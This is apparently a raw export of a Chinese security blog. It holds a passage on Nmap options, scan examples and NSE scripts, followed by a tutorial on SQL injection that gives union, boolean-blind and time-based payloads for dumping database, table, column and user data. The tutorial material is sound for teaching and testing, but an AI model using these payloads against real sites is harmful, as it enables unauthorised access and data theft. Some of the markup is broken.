<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">ndiff <span class="number">1</span>.<span class="keyword">xml</span> <span class="title">2</span>.<span class="keyword">xml</span> <span class="title">(1</span>.xml和<span class="number">2</span>.xml是Nmap扫描结果的xml格式。-oX)</span><br></pre></td></tr></table></figure>
<h3 id="可视化Nmap的使用"><a href="#可视化Nmap的使用" class="headerlink" title="可视化Nmap的使用"></a>可视化Nmap的使用</h3><h4 id="可视化Nmap（Zenmap）介绍"><a href="#可视化Nmap（Zenmap）介绍" class="headerlink" title="可视化Nmap（Zenmap）介绍"></a>可视化Nmap（Zenmap）介绍</h4><p>Nmap命令参数复杂，组合类型多种多样，如果使用命令行类型的Nmap需要记忆大量命令，对于网络管理员和渗透测试者都是一项艰巨的任务。但是如果使用可视化Nmap（Zenmap），那么就不存在这样的问题。<br>在安装Nmap的同时，会自动安装可视化Nmap（Zenmap），可以在安装目录中找到。</p>
<h4 id="Zenmap的使用"><a href="#Zenmap的使用" class="headerlink" title="Zenmap的使用"></a>Zenmap的使用</h4><p>配置扫描策略</p>
<h3 id="选项摘要"><a href="#选项摘要" class="headerlink" title="选项摘要"></a>选项摘要</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">主机发现：</span><br><span class="line">  -<span class="ruby">A：启用操作系统检测，版本检测，脚本扫描和跟踪路由</span></span><br><span class="line"><span class="ruby">  -sn：Ping扫描 - 禁用端口扫描</span></span><br><span class="line"><span class="ruby">  -Pn：将所有主机视为在线 - 跳过主机发现(无 ping)</span></span><br><span class="line"><span class="ruby">  -PS / PA / PU / PY [端口列表]：给定端口的TCP SYN / ACK，UDP或SCTP发现</span></span><br><span class="line"><span class="ruby">  -PE / PP / PM：ICMP回送，时间戳和网络掩码请求发现探测</span></span><br><span class="line"><span class="ruby">  -PO [协议列表]：IP协议Ping</span></span><br><span class="line"><span class="ruby">  --dns-servers &lt;serv1 [，serv2]，...&gt;：指定自定义DNS服务器</span></span><br><span class="line"><span class="ruby">  --system-dns：使用OS的DNS解析器</span></span><br><span class="line"><span class="ruby">  --traceroute：每个主机的跟踪跳转路径</span></span><br><span class="line"><span class="ruby">扫描技术：</span></span><br><span class="line"><span class="ruby">  -sS / sT / sA / sW / sM：TCP SYN / Connect（）/ ACK / Window / Maimon扫描</span></span><br><span class="line"><span class="ruby">  -sU：UDP扫描</span></span><br><span class="line"><span class="ruby">  -sN / sF / sX：TCP Null，FIN和Xmas扫描</span></span><br><span class="line"><span class="ruby">  --scanflags &lt;flags&gt;：自定义TCP扫描标志</span></span><br><span class="line"><span class="ruby">  -sI &lt;zombie host [：probeport]&gt;：空闲扫描</span></span><br><span class="line"><span class="ruby">  -sY / sZ：SCTP INIT / COOKIE-ECHO扫描</span></span><br><span class="line"><span class="ruby">  -sO：IP协议扫描</span></span><br><span class="line"><span class="ruby">  -b &lt;FTP中继主机&gt;：FTP反弹扫描</span></span><br><span class="line"><span class="ruby">端口扫描：</span></span><br><span class="line"><span class="ruby">  -p &lt;端口范围&gt;：仅扫描指定的端口</span></span><br><span class="line"><span class="ruby">    例如：-p22; -p1-<span class="number">65535</span>; -p U：<span class="number">53</span>,<span class="number">111</span>,<span class="number">137</span>，T：<span class="number">21</span>-<span class="number">25</span>,<span class="number">80</span>,<span class="number">139</span>,<span class="number">8080</span>，S：<span class="number">9</span></span></span><br><span class="line"><span class="ruby">  --exclude-ports &lt;端口范围&gt;：从扫描中排除指定的端口</span></span><br><span class="line"><span class="ruby">  -F：快速模式 - 扫描比默认扫描更少的端口</span></span><br><span class="line"><span class="ruby">  -r：连续扫描端口 - 不要随机化</span></span><br><span class="line"><span class="ruby">  --top-ports &lt;number&gt;：扫描&lt;number&gt;最常见的端口</span></span><br><span class="line"><span class="ruby">服务/版本检测：</span></span><br><span class="line"><span class="ruby">  -sV：探测开放端口以确定服务/版本信息</span></span><br><span class="line"><span class="ruby">  --version-intensity &lt;level&gt;：从<span class="number">0</span>（亮）到<span class="number">9</span>（尝试所有探针）设置</span></span><br><span class="line"><span class="ruby">  --version-light：限制最可能的探针（强度<span class="number">2</span>）</span></span><br><span class="line"><span class="ruby">  --version-all：尝试每一个探针（强度<span class="number">9</span>）</span></span><br><span class="line"><span class="ruby">  --version-trace：显示详细的版本扫描活动（用于调试）</span></span><br><span class="line"><span class="ruby">脚本扫描：</span></span><br><span class="line"><span class="ruby">  -sC：相当于--script = default</span></span><br><span class="line"><span class="ruby">  --script = &lt;Lua scripts&gt;：&lt;Lua scripts&gt;是逗号分隔的列表目录，脚本文件或脚本类别</span></span><br><span class="line"><span class="ruby">  --script-args = &lt;n1 = v1，[n2 = v2，...]&gt;：为脚本提供参数</span></span><br><span class="line"><span class="ruby">  --script-args-file = filename：在文件中提供NSE脚本args</span></span><br><span class="line"><span class="ruby">  --script-trace：显示发送和接收的所有数据</span></span><br><span class="line"><span class="ruby">  --script-updatedb：更新脚本数据库。</span></span><br><span class="line"><span class="ruby">  --script-help = &lt;Lua scripts&gt;：显示有关脚本的帮助。</span></span><br><span class="line"><span class="ruby">操作系统检测：</span></span><br><span class="line"><span class="ruby">  -O：启用OS检测</span></span><br><span class="line"><span class="ruby">  --osscan-limit：将OS检测限制为有希望的目标</span></span><br><span class="line"><span class="ruby">  --osscan-guess：更积极地猜测操作系统</span></span><br><span class="line"><span class="ruby">时间和性能：</span></span><br><span class="line"><span class="ruby">  采用&lt;time&gt;的选项以秒为单位，或追加<span class="string">'ms'</span>（毫秒），</span></span><br><span class="line"><span class="ruby">  该值的<span class="string">'s'</span>（秒），<span class="string">'m'</span>（分钟）或<span class="string">'h'</span>（小时）（例如<span class="number">30</span>m）。</span></span><br><span class="line"><span class="ruby">  -T &lt;<span class="number">0</span>-<span class="number">5</span>&gt;：设置时序模板（越高越快）</span></span><br><span class="line"><span class="ruby">  --min-hostgroup / max-hostgroup &lt;size&gt;：并行主机扫描组大小</span></span><br><span class="line"><span class="ruby">  --min-parallelism / max-parallelism &lt;numprobes&gt;：探测并行化</span></span><br><span class="line"><span class="ruby">  --min-rtt-timeout / max-rtt-timeout / initial-rtt-timeout &lt;time&gt;：指定探测往返时间。</span></span><br><span class="line"><span class="ruby">  --max-retries &lt;tries&gt;：端口扫描探测重传的上限数量。</span></span><br><span class="line"><span class="ruby">  --host-timeout &lt;time&gt;：在此之后放弃目标</span></span><br><span class="line"><span class="ruby">  --scan-delay /  -  max-scan-delay &lt;time&gt;：调整探针之间的延迟</span></span><br><span class="line"><span class="ruby">  --min-rate &lt;number&gt;：发送数据包的速度不低于每秒&lt;number&gt;</span></span><br><span class="line"><span class="ruby">  --max-rate &lt;number&gt;：发送数据包的速度不超过&lt;number&gt;每秒</span></span><br><span class="line"><span class="ruby">防火墙/ IDS逃脱和防御：</span></span><br><span class="line"><span class="ruby">  -F; --mtu &lt;val&gt;：分段数据包（可选择w /给定MTU）</span></span><br><span class="line"><span class="ruby">  -D &lt;decoy1，decoy2 [，ME]，...&gt;：用诱饵披露扫描</span></span><br><span class="line"><span class="ruby">  -S &lt;IP_Address&gt;：欺骗源地址</span></span><br><span class="line"><span class="ruby">  -e &lt;iface&gt;：使用指定的接口</span></span><br><span class="line"><span class="ruby">  -g /  -  source-port &lt;portnum&gt;：使用给定的端口号</span></span><br><span class="line"><span class="ruby">  --proxies &lt;url1，[url2]，...&gt;：通过HTTP / SOCKS4代理的中继连接</span></span><br><span class="line"><span class="ruby">  --data &lt;hex string&gt;：为发送的数据包附加自定义有效负载</span></span><br><span class="line"><span class="ruby">  --data-string &lt;string&gt;：为发送的数据包附加自定义ASCII字符串</span></span><br><span class="line"><span class="ruby">  --data-length &lt;num&gt;：将随机数据附加到已发送的数据包</span></span><br><span class="line"><span class="ruby">  --ip-options &lt;options&gt;：发送带有指定ip选项的数据包</span></span><br><span class="line"><span class="ruby">  --ttl &lt;val&gt;：设置IP生存时间字段</span></span><br><span class="line"><span class="ruby">  --spoof-mac &lt;mac address / prefix / vendor name&gt;：欺骗你的MAC地址</span></span><br><span class="line"><span class="ruby">  --badsum：使用伪TCP / UDP / SCTP校验和发送数据包</span></span><br><span class="line"><span class="ruby">OUTPUT：</span></span><br><span class="line"><span class="ruby">  -oN / -oX / -oS / -oG &lt;file&gt;：正常输出扫描，XML，s <span class="params">| &lt;rIpt kIddi3，和Grepable格式，分别为给定的文件名。</span></span></span><br><span class="line"><span class="ruby">  -oA &lt;basename&gt;：一次输出三种主要格式</span></span><br><span class="line"><span class="ruby">  -v：增加详细级别（使用-vv或更高级别以获得更好的效果）</span></span><br><span class="line"><span class="ruby">  -d：提高调试级别（使用-dd或更多以获得更好的效果）</span></span><br><span class="line"><span class="ruby">  --reason：显示端口处于特定状态的原因</span></span><br><span class="line"><span class="ruby">  --open：仅显示打开（或可能打开）的端口</span></span><br><span class="line"><span class="ruby">  --packet-trace：显示发送和接收的所有数据包</span></span><br><span class="line"><span class="ruby">  --iflist：打印主机接口和路由（用于调试）</span></span><br><span class="line"><span class="ruby">  --append-output：附加到而不是clobber指定的输出文件</span></span><br><span class="line"><span class="ruby">  --resume &lt;filename&gt;：恢复中止扫描</span></span><br><span class="line"><span class="ruby">  --stylesheet &lt;path / URL&gt;：用于将XML输出转换为HTML的XSL样式表</span></span><br><span class="line"><span class="ruby">  --webxml：来自Nmap.Org的参考样式表，用于更多可移植的XML</span></span><br><span class="line"><span class="ruby">  --no-stylesheet：防止与XML输出相关联的XSL样式表</span></span><br></pre></td></tr></table></figure>

<h3 id="常用选项示例"><a href="#常用选项示例" class="headerlink" title="常用选项示例"></a>常用选项示例</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">nmap</span> <span class="string">-sP</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>		<span class="comment">#查看一个主机是否在线</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-O</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.100</span>	<span class="comment">#判断目标操作系统类型</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-p</span> <span class="number">1</span><span class="number">-21</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>	<span class="comment">#扫描指定端口范围</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>		<span class="comment">#查看目标开放端口对应的协议及版本信息</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-A</span> <span class="string">T4</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>		<span class="comment">#常规扫描(常用)</span></span><br></pre></td></tr></table></figure>
<h3 id="常用NSE脚本"><a href="#常用NSE脚本" class="headerlink" title="常用NSE脚本"></a>常用NSE脚本</h3><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">http-php-version   <span class="comment">#获得PHP版本信息</span></span><br><span class="line">Http-<span class="class"><span class="keyword">enum</span>          <span class="comment">#枚举Web站点目录</span></span></span><br><span class="line">smtp-strangeport   <span class="comment">#判断SMTP是否运行在默认端口</span></span><br><span class="line">dns-blacklist      <span class="comment">#发现IP地址黑名单</span></span><br><span class="line"><span class="comment">#检测WAF</span></span><br><span class="line">nmap -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-detect <span class="number">192.168</span>.<span class="number">0.100</span></span><br><span class="line">nmap -p <span class="number">80</span>,<span class="number">443</span> --script=http-waf-fingerprint www.victom.com</span><br><span class="line"><span class="comment">#扫描WordPress</span></span><br><span class="line"><span class="number">1</span>.http-wordpress-plugins</span><br><span class="line"><span class="number">2</span>.http-wordpress-<span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="number">3</span>.http-wordpress-brute</span><br><span class="line"></span><br><span class="line">nmap --script=vuln <span class="number">192.168</span>.<span class="number">137</span>.*     <span class="comment">#扫描常见漏洞</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/posts/e73517db.html</url>
    <content><![CDATA[<img src="/posts/e73517db/1.jpg" class="" title="This is an 1 image">
<a id="more"></a>
<h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p>
<h3 id="SQL的类型"><a href="#SQL的类型" class="headerlink" title="SQL的类型"></a>SQL的类型</h3><h4 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h4><ol>
<li>数字型注入:无需闭合 多为id?=1 and 1=1 –+</li>
<li>字符型注入:需要闭合 多为name=’admin’ and 1=1 #</li>
<li>搜索型注入:主要在数据搜索时没有过滤搜索参数search=’%搜索%’ and ‘%1%’=’%1%’</li>
</ol>
<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul>
<li>基于布尔的盲注:根据页面返回结果判断条件真假注入</li>
<li>基于时间的忙著:根据页面响应时间判断条件真假注入</li>
<li>基于错误的注入:根据页面返回的错误信息查看数据库内容</li>
<li>联合查询注入:可以使用union查询数据库内容</li>
<li>堆查询注入:可以同时执行多条语句</li>
</ul>
<h4 id="按照数据请求方式来分类"><a href="#按照数据请求方式来分类" class="headerlink" title="按照数据请求方式来分类"></a>按照数据请求方式来分类</h4><p>GET注入：HTTP请求方式为get，注入点一般在get传入的参数部分。<br>POST注入：HTTP请求方式为post，注入点一般为提交的HTML表单，即post传入的数据内容。<br>HTTP头注入：HTTP的请求头存在注入点，例如XFF头，cookie，host这些都是常见的注入点。</p>
<h2 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a>MySQL常用的系统函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()                     #MySQL版本</span><br><span class="line">user()                        #数据库用户名</span><br><span class="line">database()                    #数据库名</span><br><span class="line">current_user()                #当前用户名</span><br><span class="line">system_user()                 #系统用户名</span><br><span class="line">session_user()                #连接数据库的用户名</span><br><span class="line">@@datadir                     #数据库路径</span><br><span class="line">@@version_compile_os          #操作系统版本</span><br><span class="line">@@basedir                     #数据库安装路径</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询注入利用的前提条件是有<code>显示位</code><br>显示位就是在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p>
<h3 id="联合注入所用函数"><a href="#联合注入所用函数" class="headerlink" title="联合注入所用函数"></a>联合注入所用函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union           #union操作符用于连接两个以上的select语句的结果组合到一个结果集合中</span><br><span class="line">select          #select语句用于从数据库中选取数据</span><br><span class="line">order by        #order by 关键字默认按升序对结果进行排序</span><br><span class="line">group_concat()  #把括号内的值打印在一行,以逗号分隔,以升序排列</span><br><span class="line">from            #从</span><br><span class="line">where           #有条件地从表中选取数据</span><br></pre></td></tr></table></figure>

<h3 id="information-schema数据库说明"><a href="#information-schema数据库说明" class="headerlink" title="information_schema数据库说明"></a>information_schema数据库说明</h3><p>这是一个信息数据库,其中保存着其他数据库的数据库名，数据库的表名，数据库表里的列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema.SCHEMATA表：提供了当前mysql中数据库的信息。</span><br><span class="line">information_schema.TABLES表：提供了数据库中表的信息。</span><br><span class="line">information_schema.COLUMNS表：提供了表中的列信息。</span><br><span class="line">table_schema:数据库名</span><br><span class="line">table_name:表名</span><br><span class="line">column_name:列名</span><br></pre></td></tr></table></figure>
<h3 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h3><ol>
<li>判断注入点</li>
<li>判断是整型还是字符型</li>
<li>判断查询列数</li>
<li>判断显示位</li>
<li>获取所有数据库名</li>
<li>获取数据库所有表名</li>
<li>获取字段名</li>
<li>获取字段中的数据</li>
</ol>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>例：<a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>可以使用 <code>and 1=1</code> 和<code>and 1=2</code>  根据页面的不同判断（整形判断）</p>
<img src="/posts/e73517db/2.png" class="" title="This is an 2 image">
<img src="/posts/e73517db/3.png" class="" title="This is an 3 image">
<p>还可以使用 单引号<code>&#39;</code>判断显示数据库错误信息或者页面回显不同（整形字符串类型的判断） </p>
<img src="/posts/e73517db/4.png" class="" title="This is an 4 image">
<h4 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h4><p>输入<code>and 1=1</code>和<code>and 1=2</code>后发现页面变化，判断为整型注入<br>后台代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入&#96;&#39; and 1&#x3D;1 %23&#96;和 &#96;&#39; and 1&#x3D;2%23&#96;后发现页面变化，判断为字符注入</span><br><span class="line">后台代码为：</span><br><span class="line">&#96;&#96;&#96;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<h4 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h4><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数</p>
<p>输入 <code>order by 4%23</code>  发现页面错误，说明没有4列</p>
<img src="/posts/e73517db/5.png" class="" title="This is an 5 image">
<p>输入3列时，页面正常，说明有3列</p>
<img src="/posts/e73517db/6.png" class="" title="This is an 6 image">
<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><p>例 <a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">www.xxx.com/view?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3</span></span><br></pre></td></tr></table></figure>

<img src="/posts/e73517db/7.png" class="" title="This is an 7 image">
<h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 8.png This is an 8 image %&#125;</span><br><span class="line">#### 获取数据库所有表名</span><br></pre></td></tr></table></figure>
<p><a href="http://www.xxx.com/view?id=-1" target="_blank" rel="noopener">www.xxx.com/view?id=-1</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’库名’</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img <span class="number">9.</span>png This is an <span class="number">9</span> image %&#125;</span><br><span class="line">#### 获取字段名</span><br></pre></td></tr></table></figure>
<p><a href="http://www.xxx.com/view?id=-1" target="_blank" rel="noopener">www.xxx.com/view?id=-1</a> union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’表名’</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img <span class="number">10.</span>png This is an <span class="number">10</span> image %&#125;</span><br><span class="line">#### 获取字段中的数据</span><br></pre></td></tr></table></figure>
<p><a href="http://www.xxx.com/view?id=-1" target="_blank" rel="noopener">www.xxx.com/view?id=-1</a> union select 1,2,group_concat(username) from 字段名</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img <span class="number">11.</span>png This is an <span class="number">11</span> image %&#125;</span><br><span class="line">## 基于布尔的盲注</span><br><span class="line">页面中没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常。</span><br><span class="line">### 布尔盲注所用函数</span><br><span class="line">MYSQL的substr函数的使用</span><br></pre></td></tr></table></figure>
<p>格式：SUBSTR(string,start,len)<br>含义：从string的start位开始截取len个字符</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">MYSQL的<span class="keyword">ascii</span>函数的使用</span><br></pre></td></tr></table></figure>
<p>格式：ASCII(char)<br>含义：将char转化成ascii码 </p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">MYSQL的<span class="built_in">length</span>函数的使用</span><br></pre></td></tr></table></figure>
<p>格式：length(str)<br>含义：返回str字符串的长度</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">首先要记得常见的ASCII，[A-Z]:[<span class="number">65</span><span class="number">-90</span>], [a-z]:[<span class="number">97122</span>], [<span class="number">0</span><span class="number">-9</span>]:[<span class="number">48</span><span class="number">-57</span>]</span><br><span class="line">### 布尔盲注过程</span><br><span class="line">#### 猜库</span><br><span class="line">##### 猜数据库名的长度</span><br></pre></td></tr></table></figure>
<p>and length(database())=8  –+</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">##### 猜数据库名的第一个字符</span><br></pre></td></tr></table></figure>
<p>and ascii(substr(database(),1,1)) = 115 –+<br>猜数据库名的第二个字符就要把substr(database(),2,1)修改</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">#### 猜表</span><br><span class="line">##### 猜表的数量</span><br></pre></td></tr></table></figure>
<p>and(select count(table_name) from information_schema.tables where table_schema = database()) = 4 –+</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">##### 猜表的长度</span><br><span class="line">``` </span><br><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span> <span class="comment">--+ </span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表名的第一个字符"><a href="#猜表名的第一个字符" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))) =<span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜列"><a href="#猜列" class="headerlink" title="猜列"></a>猜列</h4><h5 id="猜列的数量"><a href="#猜列的数量" class="headerlink" title="猜列的数量"></a>猜列的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span>) =<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">因为已知表名 所以直接查</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的长度"><a href="#猜第一个列名的长度" class="headerlink" title="猜第一个列名的长度"></a>猜第一个列名的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">如果猜第二个列的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的第一个字符"><a href="#猜第一个列名的第一个字符" class="headerlink" title="猜第一个列名的第一个字符"></a>猜第一个列名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)))=<span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">如果猜列名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个列名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据的数量"><a href="#猜数据的数量" class="headerlink" title="猜数据的数量"></a>猜数据的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(列名) <span class="keyword">from</span> 表名)=<span class="number">13</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的长度"><a href="#猜第一个数据的长度" class="headerlink" title="猜第一个数据的长度"></a>猜第一个数据的长度</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((select 列名 <span class="keyword">from</span> 表名 limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">4</span> --+</span><br><span class="line">如果猜第二个数据的长度就替换limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的第一个字符"><a href="#猜第一个数据的第一个字符" class="headerlink" title="猜第一个数据的第一个字符"></a>猜第一个数据的第一个字符</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1)) =68 --+</span><br><span class="line">如果要猜第一个数据的第二个字符就把substr(*,2,1)替换</span><br><span class="line">如果要猜第二个数据的第一个字符就替换limit 1,1</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>页面没有显示位，也没有输出SQL语句执行错误信息。正确的SQL语句和错误的SQL语句返回的页面都一样，但是加入sleep(5)条件后，页面的返回速度明显慢了5秒。</p>
<h3 id="时间盲注所用函数"><a href="#时间盲注所用函数" class="headerlink" title="时间盲注所用函数"></a>时间盲注所用函数</h3><p>MYSQL的substr函数的使用</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">格式：SUBSTR(<span class="keyword">string</span>,<span class="built_in">start</span>,<span class="built_in">len</span>)</span><br><span class="line">含义：从<span class="keyword">string</span>的<span class="built_in">start</span>位开始截取<span class="built_in">len</span>个字符</span><br></pre></td></tr></table></figure>
<p>MYSQL的ascii函数的使用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">格式：ASCII(<span class="type">char</span>) </span><br><span class="line">含义：将<span class="type">char</span>转化成ascii码</span><br></pre></td></tr></table></figure>
<p>MYSQL的length函数的使用</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">格式：<span class="keyword">length</span>(<span class="keyword">str</span>)</span><br><span class="line">含义：返回<span class="keyword">str</span>字符串的长度</span><br></pre></td></tr></table></figure>
<p>首先要记得常见的ASCII，[A-Z]:[65-90], [a-z]:[97122], [0-9]:[48-57]</p>
<h3 id="时间盲注过程"><a href="#时间盲注过程" class="headerlink" title="时间盲注过程"></a>时间盲注过程</h3><h4 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h4><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">and sleep(<span class="number">5</span>) --+</span><br><span class="line">and <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">0</span>,<span class="number">1</span>, sleep(<span class="number">10</span>)) --+</span><br><span class="line">``` </span><br><span class="line">#### 猜库</span><br><span class="line">##### 猜数据库名的长度</span><br><span class="line">```and <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure>
